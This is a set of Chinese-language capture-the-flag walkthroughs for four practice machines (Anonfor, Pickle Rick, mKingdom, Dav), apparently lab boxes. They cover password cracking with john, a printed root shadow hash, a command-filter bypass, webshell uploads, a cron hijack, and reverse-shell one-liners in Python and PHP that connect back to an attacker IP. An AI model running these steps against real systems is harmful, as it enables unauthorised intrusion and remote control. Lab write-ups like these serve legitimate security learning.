Anonfor

描述：boot2root machine for FIT and bsides guatemala CTF

扫描端口

用 ftp 匿名登录

在 home/melodias 下找到 user.txt

get 下载到本地

又在 notread 目录下找到两个文件，下载下来

private.asc 是一段 pgp 私钥

backup.pgp 是一段加密字符

开始破解，得到密码 xbox360

gpg2john private.asc > pgp.hash 
john pgp.hash --wordlist=/usr/share/wordlists/rockyou.txt

使用密码 xbox360 导入私钥

gpg --import private.asc

解密 backup.pgp

gpg --decrypt backup.pgp

得到了/etc/shadow 哈希文件，里面有 root 密码哈希

root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5

破解密码

gpg --decrypt backup.pgp > shadow 
john shadow --wordlist=/usr/share/wordlists/rockyou.txt

得到密码 hikari，ssh登录

Pickle Rick

描述：A Rick and Morty CTF. Help turn Rick back into a human!

进入网站，在控制台得到用户名 R1ckRul3s

目录扫描

gobuster dir -u http://10.49.138.14 -w /usr/share/wordlists/dirb/common.txt

访问 /robots.txt，只有一串字符串 Wubbalubbadubdub，猜测可能是密码

访问 /login.php

用户名：R1ckRul3s

密码：Wubbalubbadubdub

成功登录，进去后是一个可以命令执行的输入框，输入 ls 出现结果

尝试 cat Sup3rS3cretPickl3Ingred.txt

但是命令被禁止了

那就使用其他文件查看的命令

尝试 more 不行，使用 tac 成功得到第一个 flag

再 tac clue.txt，因为该英文单词是线索的意思

显示 Look around the file system for the other ingredient，让我们查看其它文件系统

输入 ls /home ，输出 rick 和 ubuntu

输入 ls -l /home/rick ，输出 -rwxrwxrwx 1 root root 13 Feb 10 2019 second ingredients

查看该文件，文件名带空格，因此需要引号，成功得到 flag 以及一段 base64 编码

对该 base64 经过数次解码得到 rabbit hole，兔子洞

接下来尝试提权，输入 sudo -l，可以无密码以 root 执行任意命令

输入 sudo ls /root 输出 3rd.txt

输入 sudo tac /root/3rd.txt 得到最后一个 flag

mKingdom

描述：Beginner-friendly box inspired by a certain mustache man.

​

扫描端口

访问 85 端口，就一个鬼脸，然后什么都没有了

目录扫描

访问 /app，有一个按钮，点击进去是一个网站，使用了concrete5 cms，右边还有一个登录按钮

登录页面，使用弱密码 admin/password成功登录

进入后台，有可进行文件上传的地方

设置里面可以设置上传的文件类型，添加上php

上传木马文件

蚁剑连接，在 /home 目录下有两个用户

知道了 toad 用户的密码，mario 的没找到

蚁剑终端里不能切换用户，也不能反弹 shell，于是上传该 单文件 PHP shell

上传后直接访问该 php 文件即可，攻击机监听端口，使用 python 反弹 shell

python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.206.169',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

使用刚才得到的密码登录 toad

该账户目录下只有一个 smb.txt

执行 env 命令，发现密码字段

base64 解码

ikaTeNTANtES

使用该密码登录 mario 账户

查看 user.txt 文件结果没权限

后面不会了，看 wp

原理就是每一分钟就会自动下载 mkingdom.thm:85 端口下 /www/app/castle/application 文件夹里面的 counter.sh 文件

修改 hosts 文件

本地桌面创建同名文件 counter.sh ,写入反弹指令

同时 python开启 85 端口允许靶机访问，同时监听反弹端口

等待一会成功反弹

但是同样没有权限

那就修改 counter.sh 文件，不再反弹，而是复制我们需要的位版本到指定目录

Dav

描述：boot2root machine for FIT and bsides guatemala CTF

扫描端口，只开放了 80 端口，进去是一个阿帕奇默认页面

那就使用 gobuister 扫目录，得到目录 /webdav

访问该地址弹出登录框

webdav 是阿帕奇自带的一个模块，github 搜索默认密码 ，使用 wammp/xammp成功登录

进去后有一个文件，查看就是 webdav 的账号密码，然后就没啥了

创建 shell.php，里面写入反弹指令

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.206.169/4444 0>&1'");?>

使用 cadaver 连接，然后使用 put 上传后门

本机监听端口，再去网页端访问 /webdav/shell.php

成功反弹

sudo -l 发现可以我i密码 root 执行 /bin/cat

那就直接查看 root.txt
